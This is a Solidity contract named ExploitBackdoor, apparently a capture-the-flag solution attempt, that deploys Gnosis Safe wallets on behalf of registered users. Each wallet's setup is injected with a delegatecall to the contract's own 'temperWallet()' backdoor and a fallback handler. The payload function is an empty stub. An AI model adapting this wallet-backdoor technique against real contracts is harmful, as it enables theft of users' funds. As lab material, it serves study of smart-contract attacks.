// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";
import "./WalletRegistry.sol";

contract ExploitBackdoor {
    using Address for address;

    GnosisSafe private safe;
    GnosisSafeProxyFactory private factory;
    WalletRegistry walletRegistry; //this address needs to be creation callback
    address[] users;
    IERC20 token;

    // User -> Wallet
    mapping(address => GnosisSafeProxy) private wallets;

    constructor(
        address[] memory _users,
        GnosisSafe _safe,
        GnosisSafeProxyFactory _factory,
        WalletRegistry _walletRegistry,
        address _token
    ) {
        factory = _factory;
        safe = _safe;
        users = _users;
        walletRegistry = _walletRegistry;
        token = IERC20(_token);
    }

    function execute() external {
        for (uint8 i = 0; i < users.length; i++) {
            address user = users[i];
            setupWallet(user, i);
        }
    }

    function setupWallet(address _user, uint256 nonce) private {
        GnosisSafeProxy proxy = factory.createProxyWithCallback(
            address(safe),
            generateWalletInitializer(_user),
            nonce,
            IProxyCreationCallback(walletRegistry)
        );

        wallets[_user] = proxy;

        // address(proxy).functionCall(abi.encodeWithSignature("mep()"));

        // (address[] memory enabledModules, ) = ModuleManager(address(proxy))
        //     .getModulesPaginated(address(0), 10);

        // for (uint256 i = 0; i < enabledModules.length; i++) {
        //     console.log("is enabled", enabledModules[i]);
        // }
    }

    //  Wallet Proxy is created with following data & parameters
    function generateWalletInitializer(address _user)
        private
        view
        returns (bytes memory)
    {
        address[] memory owners = new address[](1);
        owners[0] = _user;

        bytes memory backdoorData = abi.encodeWithSignature("temperWallet()");

        return
            abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                backdoorData,
                address(this), //add registry as fallback to extract in middleman
                0, // payment stuff
                0,
                0
            );
    }

    function temperWallet() external view {
        // console.log("tempering called");
        // create
    }

    receive() external payable {}

    fallback() external {}
}
